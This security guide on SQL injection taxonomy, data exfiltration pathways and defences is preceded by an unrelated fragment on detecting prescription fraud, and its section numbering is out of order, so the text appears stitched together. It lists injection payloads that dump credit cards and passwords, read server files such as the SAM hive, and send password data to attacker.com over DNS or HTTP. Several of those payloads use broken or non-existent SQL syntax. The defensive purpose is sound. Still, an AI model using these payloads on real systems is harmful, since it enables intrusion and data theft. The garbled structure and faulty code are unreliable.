## 3. Tips for Building Detection Models

1. **Feature Engineering**  
   - **Token frequency** (e.g., ‚ÄúUrgent‚Äù, ‚ÄúRefill‚Äù, ‚Äúduplicate‚Äù)  
   - **Field consistency** (e.g., name vs. signature mismatch)  
   - **Date/time gaps** (e.g., `issued_at` vs. `verified_at`)  

2. **Rule‚ÄëBased Checks** (e.g., high quantity, missing signature fields)

3. **Anomaly Detection**  
   - Train on *legitimate* schema instances and flag outliers in fields like dosage or refill counts.

4. **Machine Learning Approaches**  
   - Use supervised classifiers (Random Forest, XGBoost) on encoded features.  
   - Leverage text‚Äëbased models (BERT, spaCy) on `comments` and `instructions`.  

5. **Continuous Validation**  
   - Cross‚Äëvalidate license numbers against a master license registry.  
   - Verify digital signatures using cryptographic libraries.

## 1. SQLi Attack Taxonomy

| Category | Core Idea | Typical Target Payload | Example of Data Exfiltration |
|----------|-----------|------------------------|------------------------------|
| **Classic/Direct Injection** | Inject code directly into a vulnerable query. | `'; DROP TABLE users;--` | An attacker might modify a `SELECT * FROM users WHERE id=1` to `SELECT * FROM users WHERE id=1 UNION SELECT credit_card FROM payments --` |
| **Blind Injection** | No direct error or result returned. Attacker infers data by observing side‚Äëeffects. | `SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a'` | Boolean‚Äëbased or time‚Äëbased probing of each character. |
| **Error‚ÄëBased Injection** | Forces the DBMS to reveal error messages that contain schema or data. | `SELECT * FROM users WHERE id=1 AND 1=CONVERT(int, 'a')` | Use the error string to read passwords, table names, or even full dumps via stacked queries. |
| **Union‚ÄëBased Injection** | Exploits `UNION SELECT` to combine results from the original query and a crafted query. | `'; UNION SELECT credit_card, 1, 2 FROM payments --` | Fetches sensitive columns in one round‚Äëtrip. |
| **Time‚ÄëBased Injection** | Uses `SLEEP()` or similar functions to infer data by measuring response delay. | `SELECT * FROM users WHERE username='admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0);` | Blind exfiltration; each request reveals one bit of information. |
| **Out‚Äëof‚ÄëBand (OOB) / DNS exfiltration** | Causes the DBMS to perform a DNS or HTTP lookup that can be observed by an attacker. | `SELECT 1 FROM users WHERE username='admin' UNION SELECT 1 FROM dns.resolve('attacker.com.' || (SELECT password FROM users WHERE id=1) || '.dns-exfil.com');` | The attacker receives a DNS query that contains the secret data. |
| **Feature‚ÄëBased Exfiltration** | Uses database functions or features that return data in a non‚Äëvisible form (e.g., UDFs, XML processing). | `SELECT JSON_VALUE((SELECT credit_card FROM payments WHERE id=1),'$');` | Retrieves JSON‚Äëencoded values without triggering errors. |
| **Database‚ÄëSpecific Features** | Exploits particular vendor functions (Oracle `DBMS_LOB`, SQL Server `OPENROWSET`, MySQL `LOAD_FILE`). | `SELECT 1 FROM users UNION SELECT 1 FROM OPENROWSET(BULK 'C:\passwords.txt', SINGLE_CLOB);` | Reads files directly from the database server. |

## 2. Data Exfiltration Pathways

| Path | Mechanism | Typical Payload Example | Strengths | Weaknesses |
|------|-----------|-------------------------|-----------|------------|
| **Result Set Retrieval** | The attacker retrieves data directly in the query response. | `UNION SELECT credit_card, user_id FROM payments` | Fast, simple. | Requires visible output; blocked by strict query parsing. |
| **Error Messages** | DBMS error strings leak data. | `SELECT 1 FROM users WHERE username='admin' AND CONVERT(int, 'secret')` | Exploits weak error handling. | Some DBMSs silence errors; error printing may be disabled. |
| **Time‚ÄëBased** | Uses `SLEEP()`/`WAITFOR` to measure differences. | `...AND IF((SUBSTRING(password,1,1)='a'), SLEEP(5), 0);` | Works with hidden result sets. | Slow, requires many round‚Äëtrips; rate limiting may block. |
| **DNS / HTTP OOB** | DBMS initiates outbound connection. | `...UNION SELECT 1 FROM user_input;` then `OUTPUT TO URL('http://attacker.com/'+ data)` | Completely hidden from application logs. | Requires attacker‚Äëcontrolled DNS/HTTP server; some networks block outbound DNS on DB ports. |
| **File System Reads** | DBMS reads local files (e.g., config, password files). | `SELECT 1 FROM OPENROWSET(BULK 'C:\Windows\System32\config\SAM', SINGLE_BLOB);` | Gives privileged OS data. | File access permissions may block; some DBMSes disallow BULK. |
| **UDFs & Stored Proc Abuse** | Define custom functions that return data to the client. | `CREATE FUNCTION udf_exfil() RETURNS VARCHAR(100) AS BEGIN RETURN (SELECT password FROM users WHERE id=1); END;` | Stealthy; bypasses query filtering. | Requires ability to create UDFs; monitored by DB logs. |
| **XML / JSON Paths** | Extracts portions of XML/JSON stored in DB. | `SELECT XQuery('/user/@password') FROM users WHERE id=1` | Utilizes native data types. | Requires attacker to know XML structure. |
| **Stacked Queries** | Executes multiple statements separated by `;`. | `SELECT * FROM users; SELECT * FROM payments;` | Dumps entire tables. | Requires statement separation enabled; many frameworks use `prepare` with single statement. |

## 3. Typical Exploit Flow for Data Exfiltration

1. **Identify Vulnerability** ‚Äì Test input fields for unsanitized string usage in dynamic SQL or stored procedures.  
2. **Validate Injection Point** ‚Äì Use tautologies, error‚Äëbased or blind payloads to confirm that input is reflected.  
3. **Determine DBMS & Schema** ‚Äì Run a fingerprinting query (e.g., `SELECT @@VERSION;` or `SELECT USER();`) or infer type via error messages.  
4. **Select Exfiltration Technique** ‚Äì Pick one based on available constraints:  
   * If result sets are exposed ‚Üí use **Union‚ÄëBased**.  
   * If output is suppressed or logs are monitored ‚Üí use **Blind** or **OOB**.  
   * If DB has permissive file access ‚Üí use **File System Read**.  
5. **Iterate Character‚Äëby‚ÄëCharacter (Blind)** ‚Äì Use nested `SELECT` and conditional `IF` or `CASE` to produce observable side‚Äëeffects.  
6. **Reduce Request Count** ‚Äì Employ differential testing or `UNION` of multiple columns per request.  
7. **Dump Data** ‚Äì Store the retrieved values in a local script and aggregate.  

**Example: Blind OOB Exfiltration via DNS**  
```sql
-- Assuming a vulnerable input in a stored procedure
SET @sql = CONCAT(
    'SELECT 1 FROM users WHERE username=''admin'' AND ',
    'CASE WHEN SUBSTRING((SELECT password FROM users WHERE id=1),1,1)=''a'' ',
    'THEN 1 ELSE 0 END',
    '; ',
    'SELECT 1 FROM user_control; ',
    'SELECT 1 FROM dbms_output.put_line(CONCAT(''dns://',',
    '(SELECT password FROM users WHERE id=1),'',attacker.com'');'
);

```
The DBMS tries to resolve the DNS name, exposing the password to the attacker‚Äôs controlled DNS server.

## 4. Defensive Countermeasures

| Layer | Technique | Implementation Tips |
|-------|-----------|---------------------|
| **Input Validation** | Whitelist acceptable characters; reject anything that appears like SQL. | Regex for alphanumerics or strict length limits. |
| **Parameterized / Prepared Statements** | Separate code from data; DB handles escaping. | Use ORM or native prepared statements for all queries. |
| **Least Privilege** | Limit DB user permissions (SELECT only, no `DROP`, no `FILE`). | Avoid using root/admin accounts in the application. |
| **Error Handling** | Suppress detailed error messages; log only generic messages. | Use a generic `Error 500` response; log internal errors in a secured audit trail. |
| **Network Segmentation** | Restrict outbound DNS/HTTP from DB server. | Firewalls / WAF that block OOB traffic. |
| **Monitoring & Detection** | Query logging, anomaly detection, slow‚Äëquery logs, DNS query monitoring. | Use SIEM to flag repeated `SLEEP()` or repeated DNS queries. |
| **Database Hardening** | Disable unused functions, enforce strong password policies, enable encryption at rest. | Disable `LOAD_FILE`, `OPENROWSET`, or limit UDF creation to system accounts. |
| **Runtime Hardening** | Use Web Application Firewalls (WAF) that detect `UNION SELECT` patterns, `SLEEP(`, etc. | Signatures for known injection payloads, plus dynamic rule adjustments. |
| **Penetration Testing** | Conduct regular SQLi scans using tools (sqlmap, Burp Suite) and manual review. | Use automated scanners that can test blind and OOB scenarios. |
